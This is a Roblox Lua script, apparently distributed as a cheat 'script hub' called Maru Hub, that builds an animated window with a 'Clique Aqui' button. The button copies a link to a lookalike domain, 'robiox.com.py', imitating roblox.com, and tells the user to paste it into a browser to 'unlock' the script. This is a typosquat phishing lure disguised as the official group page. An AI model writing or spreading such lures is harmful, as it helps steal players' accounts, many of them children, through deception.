-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MaruHubUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

-- Container (inicia invisível)
local container = Instance.new("Frame")
container.Size = UDim2.new(0, 480, 0, 260)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.BackgroundColor3 = Color3.fromRGB(8, 8, 24)
container.BorderSizePixel = 0
container.ClipsDescendants = true
container.BackgroundTransparency = 1
container.Parent = screenGui

local containerCorner = Instance.new("UICorner")
containerCorner.CornerRadius = UDim.new(0, 16)
containerCorner.Parent = container

-- Título (arrastável)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "Maru Hub"
title.Font = Enum.Font.GothamBlack
title.TextSize = 34
title.TextColor3 = Color3.fromRGB(220, 220, 255)
title.TextStrokeTransparency = 0.7
title.TextStrokeColor3 = Color3.fromRGB(120, 160, 255)
title.TextTransparency = 1
title.Parent = container

-- Subtítulo
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(0.9, 0, 0, 40)
subtitle.Position = UDim2.new(0.05, 0, 0.22, 0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Entre no grupo para desbloquear o script"
subtitle.Font = Enum.Font.GothamMedium
subtitle.TextSize = 18
subtitle.TextColor3 = Color3.fromRGB(170, 170, 220)
subtitle.TextWrapped = true
subtitle.TextTransparency = 1
subtitle.Parent = container

-- Botão PRINCIPAL
local joinButton = Instance.new("TextButton")
joinButton.Size = UDim2.new(0.7, 0, 0, 44)
joinButton.Position = UDim2.new(0.15, 0, 0.48, 0)
joinButton.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
joinButton.BorderSizePixel = 0
joinButton.Font = Enum.Font.GothamBold
joinButton.Text = "Clique Aqui"
joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
joinButton.TextSize = 22
joinButton.AutoButtonColor = false
joinButton.BackgroundTransparency = 1
joinButton.TextTransparency = 1
joinButton.Visible = false  -- esconde completamente até o fade-in
joinButton.Parent = container

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = joinButton

local btnStroke = Instance.new("UIStroke")
btnStroke.Thickness = 2
btnStroke.Color = Color3.fromRGB(140, 200, 255)
btnStroke.Transparency = 0.4
btnStroke.Parent = joinButton

-- Botão FECHAR (X)
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 10)
closeButton.BackgroundTransparency = 1
closeButton.Text = "X"
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 24
closeButton.TextColor3 = Color3.fromRGB(220, 100, 100)
closeButton.TextTransparency = 1
closeButton.Parent = container

-- Feedback
local feedback = Instance.new("TextLabel")
feedback.Size = UDim2.new(0.8, 0, 0, 30)
feedback.Position = UDim2.new(0.1, 0, 0.72, 0)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.Font = Enum.Font.GothamBold
feedback.TextSize = 18
feedback.TextColor3 = Color3.fromRGB(100, 255, 180)
feedback.TextTransparency = 1
feedback.Parent = container

-- Link do grupo (mude aqui pro link real!)
local GROUP_LINK = "https://www.robiox.com.py/communities/245368165474/Maru-hub"

-- =============================================
--          Arrastar a janela
-- =============================================
local dragging
local dragInput
local dragStart
local startPos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = container.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        container.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Lógica do botão "Clique Aqui"
local function onButtonClick()
    if setclipboard then
        setclipboard(GROUP_LINK)
    elseif toclipboard then
        toclipboard(GROUP_LINK)
    else
        feedback.Text = "Copie manualmente: " .. GROUP_LINK
        feedback.TextTransparency = 0
        task.delay(6, function() feedback.TextTransparency = 1 end)
        return
    end
    
    feedback.Text = "Link copiado! Cole no navegador ✓"
    feedback.TextTransparency = 0
    
    local fade = TweenService:Create(feedback, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 1
    })
    fade:Play()
    
    local original = joinButton.BackgroundColor3
    TweenService:Create(joinButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 220, 255)}):Play()
    task.delay(0.4, function()
        TweenService:Create(joinButton, TweenInfo.new(0.5), {BackgroundColor3 = original}):Play()
    end)
end

joinButton.MouseButton1Click:Connect(onButtonClick)
joinButton.TouchTap:Connect(onButtonClick)

-- Botão Fechar
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- =============================================
--          Delay de 2 segundos + Fade-in
-- =============================================
task.delay(2, function()
    local fadeInInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    TweenService:Create(container, fadeInInfo, {BackgroundTransparency = 0}):Play()

    task.delay(0.15, function()
        TweenService:Create(title, fadeInInfo, {TextTransparency = 0}):Play()
        TweenService:Create(subtitle, fadeInInfo, {TextTransparency = 0}):Play()
        
        -- Mostra e anima o botão
        joinButton.Visible = true
        TweenService:Create(joinButton, fadeInInfo, {BackgroundTransparency = 0, TextTransparency = 0}):Play()
        
        TweenService:Create(closeButton, fadeInInfo, {TextTransparency = 0}):Play()
    end)

    -- Pulse suave no glow (começa depois do fade)
    local pulseInfo = TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    TweenService:Create(btnStroke, pulseInfo, {Transparency = 0.15}):Play()
end)

-- Estrelas cadentes
local function createStar()
    local startX = math.random(-50, 150) / 100
    local startY = -0.3
    local startPos = UDim2.new(startX, 0, startY, 0)
    
    local deltaX = 1.1 + math.random() * 0.5
    local deltaY = 1.2 + math.random() * 0.4
    local duration = math.random(4, 8)
    
    local tail = Instance.new("Frame")
    tail.Size = UDim2.new(0, math.random(40, 80), 0, math.random(2, 4))
    tail.Position = startPos
    tail.AnchorPoint = Vector2.new(0.5, 0.5)
    tail.BackgroundTransparency = 1
    tail.Rotation = 35 + math.random(-15, 15)
    tail.Parent = container
    
    local grad = Instance.new("UIGradient")
    grad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.12, 0.05),
        NumberSequenceKeypoint.new(0.45, 0),
        NumberSequenceKeypoint.new(1, 1)
    })
    grad.Color = ColorSequence.new(Color3.new(0.9, 0.95, 1))
    grad.Parent = tail
    
    local head = Instance.new("Frame")
    head.Size = UDim2.new(0, 3, 0, 3)
    head.Position = startPos
    head.AnchorPoint = Vector2.new(0.5, 0.5)
    head.BackgroundColor3 = Color3.new(1,1,1)
    head.ZIndex = 2
    head.Parent = container
    
    local headCorner = Instance.new("UICorner")
    headCorner.CornerRadius = UDim.new(1,0)
    headCorner.Parent = head
    
    local endPos = UDim2.new(startX + deltaX, 0, startY + deltaY, 0)
    local ti = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    
    TweenService:Create(head, ti, {Position = endPos, BackgroundTransparency = 1}):Play()
    TweenService:Create(tail, ti, {Position = endPos, BackgroundTransparency = 1}):Play()
    
    task.delay(duration + 0.4, function()
        pcall(function()
            head:Destroy()
            tail:Destroy()
        end)
    end)
end

task.spawn(function()
    while screenGui.Parent do
        createStar()
        task.wait(0.10 + math.random() * 0.12)
    end
end)
